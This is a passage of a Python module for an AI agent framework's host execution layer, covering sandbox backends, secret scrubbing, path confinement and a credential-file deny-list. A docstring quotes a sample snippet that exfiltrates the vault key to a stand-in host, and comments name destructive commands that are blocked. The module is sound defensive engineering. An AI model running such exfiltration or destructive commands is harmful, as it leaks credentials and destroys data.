"""Real execution environment — the operator surface Olympus was missing.

Until now Hephaestus could only run code in Anthropic's *server-side* sandbox:
it could never touch a real file, run a real shell command, or operate on a
host. This module adds a host-side execution environment so Olympus can actually
*do* things — edit files, run commands, build and test.

Be precise about what protects you, because the two mechanisms cover different
threats and the **local backend is NOT an OS sandbox**:

1. **The Action spine is the primary control.** `run_command` / `write_file`
   are registered as approval-gated ActionTypes (see builtin_actions), so an
   agent that has ingested untrusted content physically cannot execute — it can
   only PREPARE an action a human (or an explicit policy) approves. Reads
   (`read_file`, `list_dir`) are side-effect-free and exposed as plain tools.
   This is what makes the feature safe to ship; do not rely on OS confinement.
2. **Path confinement covers the file tools only.** `read_file` / `write_file`
   / `list_dir` resolve their path under a single workdir root
   (`OLYMPUS_EXEC_WORKDIR`, default `<MEMORY_DIR>/workspace`) and refuse — not
   clamp — a path that escapes it. This bounds *where files land*; it does NOT
   sandbox a shell. A `run_command` command runs with `cwd` set to that root
   and a wall-clock timeout + output cap, but on the **local** backend it has
   the invoking user's full OS privileges and network — it can read outside the
   root, reach the network, and spawn processes. Confinement here means the
   file-path tools and the process's starting directory, nothing stronger.

For genuine OS-level isolation of untrusted code, use the **docker** backend,
which runs the command inside `docker run --rm --network none` with only the
workdir bind-mounted at /work.

3. **Secrets are confined regardless of backend.** A sandboxed command does
   NOT inherit this process's environment. Secret-shaped variables — the vault
   key, the signing seed, every provider token — are stripped by `_child_env()`
   before the child starts, so an approved command cannot read a credential it
   was never granted. `OLYMPUS_EXEC_ENV_PASSTHROUGH` re-admits named variables
   one at a time when a build genuinely needs one.

Backends (`OLYMPUS_EXEC_BACKEND`):
    local   subprocess started in the workdir (default) — NOT OS-isolated;
            safety rests on the Action spine approval gate above plus the
            environment scrubbing in (3). REFUSED under sovereign or production
            mode unless `OLYMPUS_EXEC_ALLOW_UNISOLATED=1` (see
            `_isolation_refusal`), because neither posture's promise survives a
            bare subprocess with unrestricted network.
    auto    docker when a daemon is reachable, else local — "isolate if the
            host can" for deployments that must not hard-fail on a laptop.
    docker  the same command inside `docker run --rm --network none`, the
            workdir bind-mounted at /work — real isolation for untrusted builds.
    daytona remote execution on a Daytona workspace: the cmdguard-checked command
            is submitted to the workspace toolbox API over the SSRF/egress-gated
            POST choke (`OLYMPUS_DAYTONA_URL` / `_WORKSPACE` / `_TOKEN`).
The remaining Hermes backends (ssh / modal / singularity) are thin transports
over the same `run()` contract; `OLYMPUS_EXEC_DOCKER_IMAGE` and
`OLYMPUS_EXEC_NETWORK=1` tune the container.
"""

from __future__ import annotations

import contextvars
import json
import os
import re
import shlex
import signal
import subprocess
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path

from . import config

# Hard ceilings so a runaway command can't hang the heartbeat or blow up memory.
DEFAULT_TIMEOUT = int(os.environ.get("OLYMPUS_EXEC_TIMEOUT", "60"))
MAX_TIMEOUT = 600
OUTPUT_CAP = 20_000


_TRUTHY = ("1", "true", "yes", "on")

# Backends that put an OS/host boundary between the command and this process.
# `local` is deliberately absent: it is a bare subprocess with the invoking
# user's privileges and network (see the module docstring).
_ISOLATED_BACKENDS = frozenset({"docker", "daytona"})

_AUTO_BACKEND: list[str | None] = [None]     # memoized `auto` resolution


def _docker_available() -> bool:
    """Whether a docker *daemon* is reachable — not merely whether the binary
    exists. `auto` must not resolve to a backend that will then fail at run
    time with 'backend unavailable', so probe the daemon, not the PATH."""
    try:
        proc = subprocess.run(["docker", "info"], capture_output=True,
                              timeout=5)
        return proc.returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


def backend() -> str:
    """The resolved execution backend.

    `auto` prefers real isolation when the host can provide it and degrades to
    `local` when it cannot, so a hardened deployment can ask for "isolate if
    possible" without every developer laptop failing closed. The probe is
    memoized: `run()` calls this on every command and spawning `docker info`
    per command would dominate the cost of short commands."""
    raw = os.environ.get("OLYMPUS_EXEC_BACKEND", "local").strip().lower() or "local"
    if raw != "auto":
        return raw
    if _AUTO_BACKEND[0] is None:
        _AUTO_BACKEND[0] = "docker" if _docker_available() else "local"
    return _AUTO_BACKEND[0]


# Variables whose NAME alone disqualifies them from a child process, on top of
# the shared `security._SECRETISH_ENV` shape. These are the crown jewels: the
# vault key and the signing seed. Neither has a legitimate use inside a sandbox
# command, and either one leaking ends the security model.
_ENV_SECRET_DENY = frozenset({
    "OLYMPUS_SECRET_KEY",
    "OLYMPUS_SECRET_KEY_FILE",
    "OLYMPUS_SIGNING_SEED",
    "OLYMPUS_SIGNING_SEED_FILE",
})


def _child_env() -> dict[str, str]:
    """The environment a sandboxed command runs with.

    Previously this was `{**os.environ}` — every provider API key, the vault
    key (`OLYMPUS_SECRET_KEY`) and the signing seed were handed to any command
    a user approved. Combined with the `local` backend's unrestricted network
    that made a single approved snippet
    (`urlopen('http://x/?k=' + os.environ['OLYMPUS_SECRET_KEY'])`) a complete
    secret-exfiltration primitive, and it contradicted the `sovereign_mode`
    invariant, which is enforced only on this process's own HTTP paths.

    Secrets are therefore removed by DEFAULT, matched by name against the same
    `security._SECRETISH_ENV` shape used to screen outbound content, plus the
    explicit denylist above. Matching on the name (not the value) is deliberate
    and errs toward over-scrubbing: dropping a spuriously-named variable from a
    sandbox child costs nothing, while missing one leaks a credential.

    A command that legitimately needs a credential (a build that must
    `git push`, say) names it in `OLYMPUS_EXEC_ENV_PASSTHROUGH` as a
    comma-separated allowlist — an explicit, auditable opt-in per variable
    rather than a blanket inheritance."""
    from . import security

    allowed = {
        name.strip() for name in
        os.environ.get("OLYMPUS_EXEC_ENV_PASSTHROUGH", "").split(",")
        if name.strip()
    }
    env: dict[str, str] = {}
    for key, value in os.environ.items():
        if key in allowed:
            env[key] = value
            continue
        if key in _ENV_SECRET_DENY:
            continue
        if security._SECRETISH_ENV.search(key):
            continue
        env[key] = value
    env["OLYMPUS_IN_SANDBOX"] = "1"
    return env


def _isolation_refusal(be: str) -> str | None:
    """Why this backend may not execute here, or None when it may.

    The `local` backend is not an OS sandbox. That is an acceptable trade for a
    developer running approved commands on their own laptop; it is NOT
    acceptable for the two postures that make an explicit promise:

    * `sovereign_mode` promises that data leaves only to allowlisted hosts and
      that forbidden egress fails closed. A bare subprocess has unrestricted
      network, so honoring that promise while running commands on `local` is
      impossible — refuse instead of quietly breaking the invariant.
    * `is_production` refuses to boot on a forgeable signing seed
      (`witness.require_production_seed`); the same fail-closed reasoning
      applies to running untrusted-derived commands with no confinement.

    `OLYMPUS_EXEC_ALLOW_UNISOLATED=1` is the deliberate, documented escape
    hatch for an operator who has confinement at another layer (a dedicated
    VM, gVisor, a locked-down container) and knows what they are accepting."""
    if be in _ISOLATED_BACKENDS:
        return None
    if os.environ.get("OLYMPUS_EXEC_ALLOW_UNISOLATED", "").strip().lower() in _TRUTHY:
        return None
    if config.sovereign_mode():
        return ("refused: sovereign mode requires an isolated execution "
                f"backend, but '{be}' runs as a bare subprocess with "
                "unrestricted network — which would silently void the "
                "zero-egress invariant. Set OLYMPUS_EXEC_BACKEND=docker (or "
                "auto), or OLYMPUS_EXEC_ALLOW_UNISOLATED=1 to accept the risk.")
    if config.is_production():
        return ("refused: production mode requires an isolated execution "
                f"backend, but '{be}' provides no OS confinement. Set "
                "OLYMPUS_EXEC_BACKEND=docker (or auto), or "
                "OLYMPUS_EXEC_ALLOW_UNISOLATED=1 to accept the risk.")
    return None


def workdir() -> Path:
    """The root the file tools confine paths to, and the starting `cwd` for
    commands. Note: it bounds the file-path tools and where a command begins,
    not what a local shell command can reach (see the module docstring).

    Deliberately ONE shared root, never context-sensitive. A per-worker
    re-rooting (workspace/agents/<specialist>) was built and adversarially
    reviewed for ADR 0005 and REJECTED on evidence: the approval spine
    prepares/previews a file action on the worker thread but executes it from
    the web/CLI approval handler, so a context-dependent root makes approved
    actions run somewhere other than where they were previewed — plus it
    breaks inter-specialist file handoff, the gallery, and pre-existing
    workspaces.

    The safe design IS now built (see `_effective_root`): `actions.prepare()`
    pins the root resolved here into the action, and the executors confine to
    that pinned root — so an approved action runs where it was previewed even
    though this function stays context-free. That unblocks safe per-worker roots
    later; until they exist, two specialists sharing this one root can still
    write the same filename (DEFERRED #8)."""
    d = Path(os.environ.get("OLYMPUS_EXEC_WORKDIR",
                            str(config.MEMORY_DIR / "workspace")))
    d.mkdir(parents=True, exist_ok=True)
    return d.resolve()


# A pinned root is only ever honored if it is a real, non-system directory —
# a tampered payload can never redirect a write to the filesystem root or a
# sensitive system tree. (The path being written still has to CONFINE under
# the root, so even an honored pin cannot be escaped.)
_UNSAFE_PIN_ROOTS = frozenset(
    Path(p) for p in ("/", "/etc", "/root", "/home", "/usr", "/bin",
                      "/sbin", "/var", "/boot", "/dev", "/proc", "/sys"))


def _effective_root(root: str | Path | None = None) -> Path:
    """The confinement root a file operation runs under.

    Without a pin this is the one shared `workdir()`. With a pin — the root the
    action captured at PREVIEW time and carried through prepare→approve (ADR
    0005: "pinning ONE root into the prepared action so preview and execution
    share it") — execution runs under THAT root, so an approved file action
    lands exactly where the user previewed it even though `prepare()` ran on a
    specialist worker thread and `execute()` runs later from the web/CLI
    approval handler. This is the safe alternative to the rejected
    context-sensitive `workdir()`: the root travels *with* the action instead
    of being re-derived from whatever context happens to run it.

    A pin is honored only when it resolves to a real, absolute, non-system
    directory; anything else (a bogus/tampered `_pinned_root`) fails safe to
    the live `workdir()`. The path being operated on still has to confine under
    the returned root, so honoring a pin never widens what can be reached.

    With no explicit pin, writes land in the current PER-WORKER root when one is
    scoped (M1 / DEFERRED #8: `set_worker_root` during a specialist's dispatch),
    so two specialists writing the same filename never clobber each other; with
    no worker scope this is just the one shared `workdir()` — unchanged."""
    if not root:
        wr = _WORKER_ROOT.get()
        if wr:
            p = Path(wr)
            if p.is_dir():
                return p
        return workdir()
    try:
        pinned = Path(root).resolve()
    except (OSError, ValueError, RuntimeError):
        return workdir()
    if (not pinned.is_absolute() or pinned in _UNSAFE_PIN_ROOTS
            or pinned == Path(pinned.anchor) or not pinned.is_dir()):
        return workdir()
    return pinned


# --- per-worker workspace roots (M1 / DEFERRED #8) -----------------------
# Each specialist worker in a dispatch can be scoped to its OWN write root
# under `workspace/agents/<worker>/`, so concurrent same-name writes never
# clobber. Reads are a UNION across the worker roots + the shared root (see
# `_read_roots`), so the gallery, inter-specialist handoff, and pre-existing
# workspaces stay visible — the regression that got context-sensitive
# `workdir()` rejected (ADR 0005). Off unless a worker root is scoped: with no
# scope and no `agents/` dir, every path below is exactly the pre-M1 behavior.
_WORKER_ROOT: contextvars.ContextVar[str | None] = contextvars.ContextVar(
    "olympus_worker_root", default=None)
_AGENTS_DIR = "agents"          # reserved subdir; excluded from base walks


def _safe_worker(name: str) -> str:
    return re.sub(r"[^A-Za-z0-9_-]+", "-", str(name)).strip("-")[:64] or "worker"


def worker_root(name: str) -> Path:
    """The per-worker write root `workspace/agents/<name>/` (created)."""
    d = workdir() / _AGENTS_DIR / _safe_worker(name)
    d.mkdir(parents=True, exist_ok=True)
    return d.resolve()


def set_worker_root(name: str | None):
    """Scope subsequent writes in THIS context (thread/copied-context) to a
    per-worker root. Returns a token for `reset_worker_root`. `None` clears."""
    return _WORKER_ROOT.set(str(worker_root(name)) if name else None)


def reset_worker_root(token) -> None:
    _WORKER_ROOT.reset(token)


def current_worker_root() -> Path | None:
    v = _WORKER_ROOT.get()
    return Path(v) if v else None


def current_root() -> Path:
    """The root a write lands in right now — the scoped per-worker root, or the
    shared workspace. `actions.prepare()` pins THIS so preview == execution."""
    return _effective_root(None)


def _read_roots() -> list[Path]:
    """Roots a READ may resolve against, in precedence order: the current
    worker root (if scoped), the shared workspace, then sibling worker roots.
    De-duplicated. With no worker scope and no `agents/` dir this is just
    `[workdir()]` — identical to pre-M1 reads."""
    out: list[Path] = []
    seen: set[Path] = set()

    def _add(p: Path) -> None:
        rp = p.resolve()
        if rp.is_dir() and rp not in seen:
            seen.add(rp)
            out.append(rp)

    cur = current_worker_root()
    if cur:
        _add(cur)
    _add(workdir())
    agents = workdir() / _AGENTS_DIR
    if agents.is_dir():
        for d in sorted(agents.iterdir()):
            _add(d)
    return out


def _resolve_read(path: str) -> Path | None:
    """Union read: the first EXISTING confined file for `path` across
    `_read_roots()` (worker root wins), or None. Absolute paths resolve once."""
    for r in _read_roots():
        try:
            target = _confine(path, r)
        except ValueError:
            continue
        if target.exists():
            return target
    return None


def _confine(path: str, root: str | Path | None = None) -> Path:
    """Resolve `path` under the (optionally pinned) root; raise if it escapes."""
    root = _effective_root(root)
    target = (root / path).resolve() if not os.path.isabs(path) else Path(path).resolve()
    if target != root and root not in target.parents:
        raise ValueError(f"path escapes the workspace root: {path}")
    return target


@dataclass(frozen=True)
class Result:
    ok: bool
    code: int
    output: str
    watched: tuple[str, ...] = field(default=())

    def render(self) -> str:
        head = f"[exit {self.code}]" if not self.ok else "[ok]"
        body = f"{head}\n{self.output}".strip()
        if self.watched:
            body += "\n[watch] " + "\n[watch] ".join(self.watched)
        return body


def _docker_cmd(command: str, root: Path, timeout: int) -> list[str]:
    image = os.environ.get("OLYMPUS_EXEC_DOCKER_IMAGE", "python:3.11-slim")
    net = os.environ.get("OLYMPUS_EXEC_NETWORK", "").strip().lower() in (
        "1", "true", "yes", "on")
    args = ["docker", "run", "--rm",
            "-v", f"{root}:/work", "-w", "/work"]
    if not net:
        args += ["--network", "none"]
    # Resource caps. cmdguard screens shell syntax only — it cannot see danger
    # inside interpreted code (e.g. a Python snippet), so on the docker backend we
    # also bound what a runaway command can consume. Memory and PID caps default
    # on (safe for ordinary workloads); CPU share and a non-root uid are opt-in
    # because a wrong value can break a legitimate build. Any cap can be disabled
    # with 0/off/none.
    mem = os.environ.get("OLYMPUS_EXEC_MEM", "512m").strip()
    if mem and mem.lower() not in ("0", "off", "none"):
        args += ["--memory", mem]
    pids = os.environ.get("OLYMPUS_EXEC_PIDS", "256").strip()
    if pids and pids.lower() not in ("0", "off", "none"):
        args += ["--pids-limit", pids]
    cpus = os.environ.get("OLYMPUS_EXEC_CPUS", "").strip()
    if cpus:
        args += ["--cpus", cpus]
    user = os.environ.get("OLYMPUS_EXEC_USER", "").strip()
    if user:
        args += ["--user", user]
    # Defense in depth: a contained command needs no Linux capabilities and no
    # privilege escalation. Both on by default; opt out with OLYMPUS_EXEC_CAPS=on
    # (e.g. if a workload legitimately needs a capability).
    if os.environ.get("OLYMPUS_EXEC_CAPS", "").strip().lower() not in (
            "1", "true", "yes", "on"):
        args += ["--cap-drop", "ALL", "--security-opt", "no-new-privileges"]
    args += [image, "sh", "-c", command]
    return args


def _daytona_submit(command: str, timeout: int) -> dict:
    """Submit a command to the configured Daytona workspace toolbox API and
    return the parsed JSON response. Routes through the SSRF/egress-gated POST
    choke (`tools._http_post_json`, which also scans the outbound body for a
    stored secret). Raises RuntimeError when unconfigured."""
    base = os.environ.get("OLYMPUS_DAYTONA_URL", "").strip()
    ws = os.environ.get("OLYMPUS_DAYTONA_WORKSPACE", "").strip()
    if not base or not ws:
        raise RuntimeError("daytona backend needs OLYMPUS_DAYTONA_URL and "
                           "OLYMPUS_DAYTONA_WORKSPACE")
    token = os.environ.get("OLYMPUS_DAYTONA_TOKEN", "").strip()
    endpoint = f"{base.rstrip('/')}/workspace/{ws}/toolbox/process/execute"
    payload = {"command": command, "timeout": int(timeout)}
    cwd = os.environ.get("OLYMPUS_DAYTONA_CWD", "").strip()
    if cwd:
        payload["cwd"] = cwd
    headers = {"Authorization": f"Bearer {token}"} if token else None
    from . import tools
    return tools._http_post_json(endpoint, payload, timeout=int(timeout) + 10,
                                 headers=headers)


def _daytona_run(command: str, timeout: int, watch: str | None = None,
                 submit=None) -> Result:
    """Run one (already cmdguard-checked) command on a remote Daytona workspace.
    A THIN remote backend: it submits the command to the workspace API and maps
    the parsed reply into a Result. `submit(command, timeout) -> dict` is
    injectable for tests. A broken/unconfigured setup surfaces as ok=False, never
    a raise — matching the docker/local contract."""
    submit = submit or _daytona_submit
    try:
        data = submit(command, timeout)
    except ValueError as err:                    # egress/secret-exfil refused
        return Result(False, 126, f"daytona egress refused: {str(err)[:200]}")
    except Exception as err:                      # unconfigured / unexpected
        return Result(False, 127, f"daytona backend error: {str(err)[:200]}")
    if not isinstance(data, dict):
        return Result(False, 127, "daytona backend returned no JSON object")
    if data.get("_error"):                        # network/parse failure (degraded)
        return Result(False, 127,
                      f"daytona backend error: {str(data['_error'])[:200]}")
    try:
        code = int(data.get("exitCode", data.get("code",
                   data.get("exit_code", 0))) or 0)
    except (TypeError, ValueError):
        code = 0
    out = str(data.get("result") or data.get("output")
              or data.get("stdout") or "")
    watched: tuple[str, ...] = ()
    if watch:
        try:
            pat = re.compile(watch)
            watched = tuple(ln.rstrip("\n") for ln in out.splitlines()
                            if pat.search(ln))[:50]
        except re.error as err:
            watched = (f"invalid watch pattern: {err}",)
    if len(out) > OUTPUT_CAP:
        out = out[:OUTPUT_CAP] + f"\n…[truncated, {len(out)} bytes total]"
    return Result(code == 0, code, out.strip(), watched)


def _kill(proc: subprocess.Popen) -> None:
    """Kill the process (group, where we started one) and reap it."""
    try:
        if os.name == "posix":
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        else:
            proc.kill()
    except (ProcessLookupError, PermissionError, OSError):
        try:
            proc.kill()
        except OSError:
            pass
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        pass


def run(command: str, *, timeout: int | None = None,
        be: str | None = None, watch: str | None = None,
        root: str | Path | None = None) -> Result:
    """Run a shell command in the confined workspace. Never raises on a
    non-zero exit — that's reported in the Result; only truly broken setups
    (missing docker, etc.) surface as ok=False with the error in output.

    Before anything executes, the command passes through the security gate
    (cmdguard). A catastrophic command (rm -rf /, mkfs, fork bomb, …) is
    refused here — fail-closed — even if a human already approved the action.
    This protects *every* caller of run() (interactive, scheduled, heartbeat),
    not just the approval prompt.

    The timeout is activity-based: `timeout` seconds of *silence* kills the
    command, but a command that is still producing output keeps its lease,
    up to the MAX_TIMEOUT wall-clock ceiling. A silent `sleep 5` with
    timeout=1 still dies at 1s; a chatty build with timeout=60 can run to
    the ceiling. On timeout the partial output captured so far is returned
    instead of being discarded.

    `watch` is an optional regex; output lines matching it are collected
    into Result.watched so a caller (or the agent) can alert on markers
    like "ERROR" or "listening on" without re-parsing the full log."""
    if not (command or "").strip():
        return Result(False, 2, "empty command")
    from . import cmdguard
    allowed, verdict = cmdguard.check(command)
    if not allowed:
        return Result(False, 126,
                      f"blocked by the command security gate — {verdict.reason} "
                      f"[rule: {verdict.rule}]. Set OLYMPUS_EXEC_SECURITY=off to "
                      "override (not recommended).")
    timeout = max(1, min(MAX_TIMEOUT, timeout or DEFAULT_TIMEOUT))
    root = _effective_root(root)
    be = (be or backend()).lower()
    refusal = _isolation_refusal(be)
    if refusal:
        return Result(False, 126, refusal)
    if be == "daytona":
        # Remote execution on a Daytona workspace: the command already cleared
        # cmdguard above, so the same fail-closed gate protects the remote box.
        return _daytona_run(command, timeout, watch)
    if be == "docker":
        argv, shell = _docker_cmd(command, root, timeout), False
    else:
        argv, shell = command, True
    try:
        proc = subprocess.Popen(
            argv, shell=shell, cwd=str(root), text=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            start_new_session=(os.name == "posix"),
            env=_child_env())
    except FileNotFoundError as err:               # e.g. docker not installed
        return Result(False, 127, f"backend '{be}' unavailable: {err}")

    out_lines: list[str] = []
    err_lines: list[str] = []
    lock = threading.Lock()
    last_activity = [time.monotonic()]

    def _pump(stream, sink):
        for line in stream:
            with lock:
                sink.append(line)
                last_activity[0] = time.monotonic()
        stream.close()

    pumps = [threading.Thread(target=_pump, args=(proc.stdout, out_lines), daemon=True),
             threading.Thread(target=_pump, args=(proc.stderr, err_lines), daemon=True)]
    for t in pumps:
        t.start()

    start = time.monotonic()
    timed_out = False
    while proc.poll() is None:
        now = time.monotonic()
        with lock:
            idle_deadline = last_activity[0] + timeout
        if now >= min(start + MAX_TIMEOUT, idle_deadline):
            timed_out = True
            _kill(proc)
            break
        time.sleep(0.05)
    for t in pumps:
        t.join(timeout=2)

    with lock:
        out = "".join(out_lines) + (("\n" + "".join(err_lines)) if err_lines else "")
    watched: tuple[str, ...] = ()
    if watch:
        try:
            pattern = re.compile(watch)
            watched = tuple(ln.rstrip("\n") for ln in out.splitlines()
                            if pattern.search(ln))[:50]
        except re.error as err:
            watched = (f"invalid watch pattern: {err}",)
    if timed_out:
        elapsed = int(time.monotonic() - start)
        msg = (f"timed out after {elapsed}s "
               f"(no output for {timeout}s; ceiling {MAX_TIMEOUT}s)")
        partial = out.strip()
        if partial:
            if len(partial) > OUTPUT_CAP:
                partial = partial[:OUTPUT_CAP] + "\n…[truncated]"
            msg += "\npartial output:\n" + partial
        return Result(False, 124, msg, watched)
    if len(out) > OUTPUT_CAP:
        out = out[:OUTPUT_CAP] + f"\n…[truncated, {len(out)} bytes total]"
    return Result(proc.returncode == 0, proc.returncode, out.strip(), watched)


# A rare, fixed marker (never randomized — determinism keeps replay stable). The
# quoted heredoc delimiter stops the shell from expanding anything in the snippet,
# so shell metacharacters in the Python source are inert.
_PY_HEREDOC = "OLYMPUS_PY_HEREDOC_EOF"
MAX_PY_CODE = 256_000        # bound the snippet a single run_python may carry


def run_python(code: str, *, timeout: int | None = None,
               be: str | None = None, watch: str | None = None,
               root: str | Path | None = None) -> Result:
    """Run a Python snippet in the confined workspace, with the exact same
    security gate, root confinement, activity timeout and output cap as `run()`.

    The snippet is fed to `python3` on stdin through a single-quoted heredoc, so
    the shell never expands it and metacharacters in the source are inert.

    SECURITY: `cmdguard` understands *shell* syntax only — it CANNOT see danger
    inside Python source (`import os; os.system(...)`, `shutil.rmtree('/')`, a
    socket exfil, …) and is effectively a no-op on Python semantics. Untrusted
    code therefore MUST run on the `docker` backend (network-none, resource
    capped); on the `local` backend a snippet runs with the invoking user's full
    privileges, guarded only by the human approval that staged it. The heredoc
    body is still passed through `cmdguard` (so obvious shell-shaped payloads are
    refused), but do not mistake that for isolation of the Python itself."""
    if not (code or "").strip():
        return Result(False, 2, "empty code")
    if len(code) > MAX_PY_CODE:
        return Result(False, 2, f"code too large ({len(code)} bytes; "
                      f"limit {MAX_PY_CODE})")
    if _PY_HEREDOC in code:
        return Result(False, 2, "code may not contain the reserved marker "
                      f"{_PY_HEREDOC!r}")
    selected_backend = (be or backend()).lower()
    posix_command = (
        f"python3 - <<'{_PY_HEREDOC}'\n{code}\n{_PY_HEREDOC}"
    )

    if os.name == "nt" and selected_backend == "local":
        import base64
        import sys

        from . import cmdguard

        allowed, verdict = cmdguard.check(posix_command)
        if not allowed:
            return Result(
                False,
                126,
                f"blocked by the command security gate — {verdict.reason} "
                f"[rule: {verdict.rule}]. Set OLYMPUS_EXEC_SECURITY=off to "
                "override (not recommended).",
            )

        payload = base64.b64encode(code.encode("utf-8")).decode("ascii")
        runner = (
            "import base64;"
            f"exec(compile(base64.b64decode('{payload}'),"
            "'<olympus>','exec'))"
        )
        command = subprocess.list2cmdline(
            [sys.executable, "-c", runner]
        )
    else:
        command = posix_command

    return run(
        command,
        timeout=timeout,
        be=selected_backend,
        watch=watch,
        root=root,
    )


def check_written(target: Path, content: str) -> str:
    """Post-write verification: confirm the bytes actually landed, then run a
    parse-only syntax check for the formats we can validate without executing
    anything (py/json/toml/yaml). A silent partial write or a file that no
    longer parses is exactly the failure an agent won't notice on its own —
    the result string is surfaced to it in the action result."""
    try:
        on_disk = target.read_text(encoding="utf-8", errors="replace")
    except OSError as err:
        return f"write verification FAILED: cannot read back file ({err})"
    if on_disk != content:
        return (f"write verification FAILED: file has {len(on_disk)} chars, "
                f"expected {len(content)}")
    suffix = target.suffix.lower()
    try:
        if suffix == ".py":
            compile(content, str(target), "exec")
            return "verified: python syntax OK"
        if suffix == ".json":
            import json
            json.loads(content)
            return "verified: valid JSON"
        if suffix == ".toml":
            try:
                import tomllib            # stdlib on Python 3.11+
            except ModuleNotFoundError:  # 3.10: fall back to the tomli backport
                try:
                    import tomli as tomllib
                except ModuleNotFoundError:
                    return "verified: written (toml parser unavailable)"
            tomllib.loads(content)
            return "verified: valid TOML"
        if suffix in (".yaml", ".yml"):
            try:
                import yaml
            except ImportError:
                return "verified: written (yaml parser unavailable)"
            yaml.safe_load(content)
            return "verified: valid YAML"
    except SyntaxError as err:
        return f"syntax check FAILED: line {err.lineno}: {err.msg}"
    except Exception as err:
        return f"syntax check FAILED: {err}"
    return "verified: written"


def _guard_write_target(path: str, root: str | Path | None = None) -> Path:
    """Resolve a write target and reject credential-bearing paths.

    This is the single path-policy boundary shared by approval previews and
    execution. Read, search, and edit already use the same sensitive-path
    deny-list; creating or overwriting a file must not be the bypass around
    those protections.
    """
    target = _confine(path, root)
    if is_sensitive_path(target):
        raise ValueError(f"refusing to write a credential file: {path}")
    return target


def write_file(path: str, content: str, *,
               root: str | Path | None = None) -> dict:
    """Create/overwrite a file inside the workspace. Returns a result dict
    carrying the prior content (if any) so the action can be undone, plus a
    post-write verification (`check`) so silent failures and syntax errors
    are visible to the agent in the same turn.

    `root` pins the workspace root (the one captured at preview time) so an
    approved write lands where it was previewed — see `_effective_root`."""
    target = _guard_write_target(path, root)
    target.parent.mkdir(parents=True, exist_ok=True)
    existed = target.is_file()
    prior = target.read_text(encoding="utf-8", errors="replace") if existed else None
    target.write_text(content, encoding="utf-8")
    return {"path": str(target), "existed": existed, "prior": prior,
            "bytes": len(content.encode("utf-8")),
            "check": check_written(target, content)}


def undo_write(result: dict) -> str:
    """Reverse a write_file: restore the prior content, or delete a new file."""
    path = Path(result.get("path", ""))
    if is_sensitive_path(path):
        raise ValueError(f"refusing to modify a credential file: {path}")
    if result.get("existed") and result.get("prior") is not None:
        path.write_text(result["prior"], encoding="utf-8")
        return f"restored previous contents of {path.name}"
    if path.exists():
        path.unlink()
        return f"deleted new file {path.name}"
    return "nothing to undo"


# Files that hold credentials by convention. The file tools refuse to read
# them and the search tools skip them: a workspace accumulates .env files and
# keys over time, and an agent has no business feeding those to a model.
# Matched CASE-INSENSITIVELY against every path component (".ENV" and
# "ID_RSA.BAK" are the same secret — the case-sensitive version of this list
# was an actual the surveyed framework vulnerability, fixed upstream as #5097).
_SENSITIVE_PATTERNS = (
    ".env", ".env.*", "*.pem", "*.key", "*.p12", "*.pfx", "*.jks",
    "*.keystore", "id_rsa*", "id_ed25519*", "id_ecdsa*", "id_dsa*",
    "credentials", "credentials.*", "secrets.*", ".netrc", "_netrc",
    ".htpasswd", ".npmrc", ".pypirc", ".git-credentials", "*.kdbx",
)
_SENSITIVE_DIRS = frozenset({".ssh", ".aws", ".gnupg", ".gpg"})


def is_sensitive_path(path: "Path | str") -> bool:
    """Whether any component of `path` names a credential file or directory."""
    import fnmatch
    parts = Path(path).parts
    for part in parts:
        low = part.lower()
        if low in _SENSITIVE_DIRS:
            return True
        if any(fnmatch.fnmatch(low, pat) for pat in _SENSITIVE_PATTERNS):
            return True
    return False


def read_file(path: str, start_line: int | None = None,
              end_line: int | None = None) -> str:
    """Read a workspace file, optionally only lines [start_line, end_line]
    (1-indexed, inclusive) — a large file need not cost its whole length.

    Union read (M1): a bare name resolves across the current worker root, the
    shared workspace, then sibling worker roots — so a specialist reads its own
    file, and handoff/pre-existing files stay visible."""
    try:
        _confine(path)                       # surface an escape as an error
    except ValueError as err:
        return f"Error: {err}"
    target = _resolve_read(path)
    if target is None or not target.is_file():
        return f"Error: no such file in workspace: {path}"
    if is_sensitive_path(target):
        return f"Error: refusing to read a credential file: {path}"
    text = target.read_text(encoding="utf-8", errors="replace")
    if start_line is not None or end_line is not None:
        lines = text.splitlines(keepends=True)
        lo = max(1, int(start_line or 1))
        hi = int(end_line) if end_line is not None else len(lines)
        if lo > len(lines):
            return f"Error: start_line {lo} is past the end of {path} ({len(lines)} lines)"
        text = "".join(lines[lo - 1:hi])
    return text[:OUTPUT_CAP]


# Walking a big workspace has to stop somewhere; these bound grep/glob so a
# node_modules tree can't eat the request. Skipped directories mirror what a
# developer would never want searched.
_WALK_SKIP_DIRS = frozenset({".git", "__pycache__", "node_modules", ".venv",
                             "venv", ".tox", ".mypy_cache", ".pytest_cache",
                             "dist", "build", ".cache"})
_GREP_MAX_FILES = 5_000
_GREP_MAX_MATCHES = 200
_GREP_MAX_FILE_BYTES = 2_000_000


def _walk_files(root: Path):
    """Confined, bounded, deny-list-aware file walk (sorted for determinism)."""
    import os as _os
    seen = 0
    for dirpath, dirnames, filenames in _os.walk(root):
        dirnames[:] = sorted(d for d in dirnames
                             if d not in _WALK_SKIP_DIRS
                             and d.lower() not in _SENSITIVE_DIRS)
        for name in sorted(filenames):
            p = Path(dirpath) / name
            if p.is_symlink() or is_sensitive_path(p):
                continue
            seen += 1
            if seen > _GREP_MAX_FILES:
                return
            yield p


def _glob_match(rel: str, name: str, pattern: str) -> bool:
    """fnmatch with pathlib-style '**/' semantics: '**/*.py' matches top-level
    files too (plain fnmatch would demand at least one slash)."""
    import fnmatch
    if fnmatch.fnmatch(rel, pattern) or fnmatch.fnmatch(name, pattern):
        return True
    return pattern.startswith("**/") and fnmatch.fnmatch(rel, pattern[3:])


def grep_files(pattern: str, path: str = ".", glob: str = "") -> str:
    """Regex-search text files under a workspace directory. Returns
    'relpath:lineno: line' matches, bounded and binary-safe."""
    import re as _re
    try:
        rx = _re.compile(pattern)
    except _re.error as err:
        return f"Error: bad regex: {err}"
    try:
        root = _confine(path)
    except ValueError as err:
        return f"Error: {err}"
    if not root.is_dir():
        return f"Error: no such directory in workspace: {path}"
    base, out, truncated = workdir(), [], False
    for p in _walk_files(root):
        rel = p.relative_to(base)
        if glob and not _glob_match(str(rel), p.name, glob):
            continue
        try:
            if p.stat().st_size > _GREP_MAX_FILE_BYTES:
                continue
